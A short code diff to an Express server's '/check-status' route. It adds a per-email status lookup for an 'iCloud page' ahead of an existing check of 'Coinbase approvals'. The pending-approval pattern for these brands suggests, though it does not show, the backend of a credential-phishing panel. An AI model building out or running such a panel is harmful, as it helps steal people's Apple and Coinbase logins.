@@ -242,6 +242,15 @@ app.post("/check-status", (req, res) => {
       return res.json({ status: "unknown" });
     }
 
+    // ✅ Check iCloud page first
+    if (pendingPage[email]) {
+      return res.json({
+        status: pendingPage[email].status || "pending",
+        email: email
+      });
+    }
+
+    // ✅ Check Coinbase approvals
     if (pendingApprovals[email]) {
       return res.json({
         status: pendingApprovals[email].status || "pending",
